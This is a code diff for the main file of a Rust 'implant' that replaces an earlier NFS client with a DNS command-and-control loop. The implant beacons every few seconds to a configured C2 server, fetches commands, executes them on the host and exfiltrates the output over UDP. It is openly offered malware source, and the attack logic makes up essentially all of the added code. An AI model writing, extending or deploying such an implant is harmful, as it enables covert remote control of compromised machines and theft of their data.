@@ -1,76 +1,55 @@
-/* smokeless_flame - implant/src/main.rs
-*
-*   Purpose: Reside on a machine and await instruction by the controller
-*
-*
-*
-*   Author: Mauzy0x00
-*   Start Date: 10-14-2025
-*
-*   File Description: This is the main function of the implant. Supporting functions and loops will be called here
-*/
-
 mod client;
+use client::*;
+use std::net::UdpSocket;
+use std::thread;
+use std::time::Duration;
 
+const C2_SERVER: &str = "127.0.0.1:5353";
+const DOMAIN: &str = "c2.local";
+const IMPLANT_ID: &str = "implant1";
+const BEACON_INTERVAL: u64 = 5; // seconds
 
-use clap::Parser;
-use smol::{io, net, prelude::*, Unblock};
-use std::path::PathBuf;
+fn main() -> std::io::Result<()> {
+    println!("DNS C2 Implant");
+    println!("Implant ID: {}", IMPLANT_ID);
+    println!("C2 Server: {}", C2_SERVER);
+    println!("Domain: {}\n", DOMAIN);
 
-#[derive(Parser)]
-#[command(author, version, about, long_about = None)]
-struct Cli {
-    /// Turn on verbose logging
-    #[arg(short, long)]
-    verbose: Option<bool>,
+    let socket = UdpSocket::bind("0.0.0.0:0")?;
+    println!("[+] Bound to local port: {}\n", socket.local_addr()?);
 
-    /// Server address
-    #[arg(short, long)]
-    server: String,
+    loop {
+        println!("\n--- Beacon Cycle ---");
 
-    /// Local mount point
-    #[arg(short, long)]
-    mount_point: PathBuf,
-}
+        match beacon(&socket) {
+            Ok(has_commands) => {
+                if has_commands {
+                    println!("[!] Commands available!");
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let cli = Cli::parse();
+                    // Fetch and execute command
+                    match fetch_command(&socket) {
+                        Ok(Some(cmd)) => {
+                            println!("[+] Command received: {}", cmd);
 
-    // Initialize logger
-    if let Some(true) = cli.verbose {
-        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("debug")).init();
-    } else {
-        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
+                            let output = execute_command(&cmd);
+                            println!("[+] Command output:\n{}", output);
+
+                            // Exfiltrate result
+                            if let Err(e) = exfiltrate_data(&socket, &output) {
+                                println!("[!] Exfil error: {}", e);
+                            }
+                        }
+                        Ok(None) => println!("[*] No commands in queue"),
+                        Err(e) => println!("[!] Fetch error: {}", e),
+                    }
+                } else {
+                    println!("[*] No commands pending");
+                }
+            }
+            Err(e) => println!("[!] Beacon error: {}", e),
+        }
+
+        println!("\n[*] Sleeping for {} seconds...", BEACON_INTERVAL);
+        thread::sleep(Duration::from_secs(BEACON_INTERVAL));
     }
-
-    let Cli {
-        verbose,
-        server,
-        mount_point,
-    } = cli;
-    {
-        log::info!(
-            "Starting NFS client, connecting to {} and mounting at {}",
-            server,
-            mount_point.display()
-        );
-
-        // Create and run client
-        let mut client = client::NfsClient::new(server, mount_point, keypair)?;
-
-        smol::block_on(async {
-            client.connect().await?;
-
-            log::info!("Connected to server. Press Ctrl+C to disconnect.");
-
-            client.run().await?;
-
-            client.disconnect().await?;
-            log::info!("Disconnected from server");
-
-            Ok::<(), error::NfsError>(())
-        })?;
-    }
-
-    Ok(())
 }
